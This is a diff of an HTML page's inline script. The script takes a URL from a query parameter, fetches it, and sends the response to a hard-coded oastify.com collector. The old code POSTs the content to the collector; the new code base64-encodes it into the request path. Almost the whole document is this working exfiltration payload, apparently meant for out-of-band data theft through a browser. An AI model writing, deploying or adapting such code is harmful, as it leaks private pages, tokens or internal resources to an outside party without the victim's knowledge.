@@ -12,21 +12,25 @@
       if (!url) {
         console.error('No URL parameter specified!');
       } else {
-        fetch(url, { mode: 'no-cors'})
-          .then(response => response.text())
-          .then(data => {
-            const requestOptions = {
-              method: 'POST',
-              body: data
+        const options = {
+          mode: 'no-cors'
+        };
+        fetch(url, options)
+          .then(response => response.blob())
+          .then(blob => {
+            const reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = function() {
+              const base64data = reader.result.replace(/^data:(.*;base64,)?/, '');
+              const requestUrl = 'https://vxwlqug8dea280rvwji6jhg1hsnjbgz5.oastify.com/' + base64data;
+              fetch(requestUrl, { mode: 'no-cors' })
+                .then(response => response.text())
+                .then(result => console.log(result))
+                .catch(error => console.error(error));
             };
-            fetch('https://vxwlqug8dea280rvwji6jhg1hsnjbgz5.oastify.com', requestOptions)
-              .then(response => response.text())
-              .then(result => console.log(result))
-              .catch(error => console.error(error));
           })
           .catch(error => console.error(error));
       }
     </script>
   </body>
 </html>
-
